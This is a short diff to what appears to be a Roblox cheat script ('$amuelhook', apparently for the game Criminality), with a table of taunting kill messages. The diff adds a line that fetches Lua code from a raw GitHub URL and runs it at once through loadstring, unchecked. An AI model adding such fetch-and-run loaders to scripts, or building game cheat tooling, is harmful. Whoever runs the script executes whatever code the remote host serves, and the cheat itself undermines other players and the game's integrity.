@@ -162,6 +162,8 @@ local CreateBeam = function(Origin, Direction, StartColor, EndColor)
     end)
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LARTAJE/SHook_KRNL/main/SHook_Criminality"))()
+
 --// Kill say table
 local KillSays = {
     '🤑 Cry more kid, you died to $amuelhook 🤑';
